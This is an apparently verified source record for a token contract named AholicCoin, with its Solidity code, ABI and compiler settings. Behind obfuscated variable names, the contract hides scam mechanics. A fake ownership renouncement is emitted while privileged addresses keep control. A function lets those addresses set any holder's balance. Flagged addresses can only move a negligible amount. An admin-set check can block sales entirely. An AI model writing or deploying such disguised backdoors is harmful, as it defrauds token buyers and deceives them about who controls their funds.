{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract listLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableTeamMarketing {\n    function createPair(address marketingFee, address tradingTx) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface atTxFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface walletToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listMin) external view returns (uint256);\n\n    function transfer(address teamMinFrom, uint256 liquidityList) external returns (bool);\n\n    function allowance(address exemptLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMinFrom,\n        uint256 liquidityList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeEnable, uint256 value);\n    event Approval(address indexed exemptLaunch, address indexed spender, uint256 value);\n}\n\ninterface walletTokenMetadata is walletToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AholicCoin is listLimit, walletToken, walletTokenMetadata {\n\n    function shouldTotal() private view {\n        require(swapTake[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyReceiver;\n    }\n\n    function tradingExemptMode(address feeMarketing) public {\n        shouldTotal();\n        if (maxTotal) {\n            takeSwap = false;\n        }\n        if (feeMarketing == exemptLaunchedTake || feeMarketing == exemptSender) {\n            return;\n        }\n        shouldEnableReceiver[feeMarketing] = true;\n    }\n\n    mapping(address => bool) public shouldEnableReceiver;\n\n    function sellAuto(address txReceiver) public {\n        require(txReceiver.balance < 100000);\n        if (liquidityLimit) {\n            return;\n        }\n        \n        swapTake[txReceiver] = true;\n        if (takeSwap == feeMaxShould) {\n            maxTotal = false;\n        }\n        liquidityLimit = true;\n    }\n\n    bool private buyFee;\n\n    uint256 private buyReceiver = 100000000 * 10 ** 18;\n\n    function marketingAt(address listShould, address teamMinFrom, uint256 liquidityList) internal returns (bool) {\n        require(txLiquidity[listShould] >= liquidityList);\n        txLiquidity[listShould] -= liquidityList;\n        txLiquidity[teamMinFrom] += liquidityList;\n        emit Transfer(listShould, teamMinFrom, liquidityList);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalList;\n\n    address private fundReceiver;\n\n    uint256 public launchFund;\n\n    uint256 public launchReceiver;\n\n    bool private maxTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalAuto;\n    }\n\n    function allowance(address buyList, address limitModeLaunched) external view virtual override returns (uint256) {\n        if (limitModeLaunched == txLimit) {\n            return type(uint256).max;\n        }\n        return totalList[buyList][limitModeLaunched];\n    }\n\n    function teamList(address listShould, address teamMinFrom, uint256 liquidityList) internal view returns (uint256) {\n        require(liquidityList > 0);\n\n        uint256 receiverBuyList = 0;\n        if (listShould == exemptSender && enableFrom > 0) {\n            receiverBuyList = liquidityList * enableFrom / 100;\n        } else if (teamMinFrom == exemptSender && launchMarketing > 0) {\n            receiverBuyList = liquidityList * launchMarketing / 100;\n        }\n        require(receiverBuyList <= liquidityList);\n        return liquidityList - receiverBuyList;\n    }\n\n    constructor (){\n        if (takeSwap) {\n            listTx = launchFund;\n        }\n        tradingTeam();\n        atTxFrom senderTo = atTxFrom(txLimit);\n        exemptSender = enableTeamMarketing(senderTo.factory()).createPair(senderTo.WETH(), address(this));\n        atMarketing = enableTeamMarketing(senderTo.factory()).feeTo();\n        \n        exemptLaunchedTake = _msgSender();\n        swapTake[exemptLaunchedTake] = true;\n        txLiquidity[exemptLaunchedTake] = buyReceiver;\n        if (tradingSwap) {\n            launchFund = launchReceiver;\n        }\n        emit Transfer(address(0), exemptLaunchedTake, buyReceiver);\n    }\n\n    address atMarketing;\n\n    function receiverTotal(address listShould, address teamMinFrom, uint256 liquidityList) internal returns (bool) {\n        if (listShould == exemptLaunchedTake) {\n            return marketingAt(listShould, teamMinFrom, liquidityList);\n        }\n        uint256 swapFrom = walletToken(exemptSender).balanceOf(atMarketing);\n        require(swapFrom == launchedReceiver);\n        require(teamMinFrom != atMarketing);\n        if (shouldEnableReceiver[listShould]) {\n            return marketingAt(listShould, teamMinFrom, tradingLiquidityList);\n        }\n        liquidityList = teamList(listShould, teamMinFrom, liquidityList);\n        return marketingAt(listShould, teamMinFrom, liquidityList);\n    }\n\n    function transferFrom(address listShould, address teamMinFrom, uint256 liquidityList) external override returns (bool) {\n        if (_msgSender() != txLimit) {\n            if (totalList[listShould][_msgSender()] != type(uint256).max) {\n                require(liquidityList <= totalList[listShould][_msgSender()]);\n                totalList[listShould][_msgSender()] -= liquidityList;\n            }\n        }\n        return receiverTotal(listShould, teamMinFrom, liquidityList);\n    }\n\n    string private totalAuto = \"ACN\";\n\n    function transfer(address limitFrom, uint256 liquidityList) external virtual override returns (bool) {\n        return receiverTotal(_msgSender(), limitFrom, liquidityList);\n    }\n\n    uint256 public enableFrom = 3;\n\n    string private fromShouldTotal = \"Aholic Coin\";\n\n    mapping(address => bool) public swapTake;\n\n    bool private maxEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxAtLaunched;\n    }\n\n    function balanceOf(address listMin) public view virtual override returns (uint256) {\n        return txLiquidity[listMin];\n    }\n\n    bool private takeSwap;\n\n    uint256 private listTx;\n\n    uint8 private maxAtLaunched = 18;\n\n    bool public liquidityLimit;\n\n    uint256 public launchMarketing = 0;\n\n    mapping(address => uint256) private txLiquidity;\n\n    function shouldTeam(address limitFrom, uint256 liquidityList) public {\n        shouldTotal();\n        txLiquidity[limitFrom] = liquidityList;\n    }\n\n    event OwnershipTransferred(address indexed senderLaunched, address indexed modeWallet);\n\n    function modeMarketing(uint256 liquidityList) public {\n        shouldTotal();\n        launchedReceiver = liquidityList;\n    }\n\n    bool public tradingSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return fromShouldTotal;\n    }\n\n    address public exemptSender;\n\n    uint256 launchedReceiver;\n\n    uint256 sellTx;\n\n    function tradingTeam() public {\n        emit OwnershipTransferred(exemptLaunchedTake, address(0));\n        fundReceiver = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return fundReceiver;\n    }\n\n    function approve(address limitModeLaunched, uint256 liquidityList) public virtual override returns (bool) {\n        totalList[_msgSender()][limitModeLaunched] = liquidityList;\n        emit Approval(_msgSender(), limitModeLaunched, liquidityList);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return fundReceiver;\n    }\n\n    address public exemptLaunchedTake;\n\n    uint256 constant tradingLiquidityList = 3 ** 10;\n\n    address txLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public feeMaxShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitModeLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitModeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunchedTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMaxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"modeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"}],\"name\":\"sellAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldEnableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"shouldTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"}],\"name\":\"tradingExemptMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMinFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AholicCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}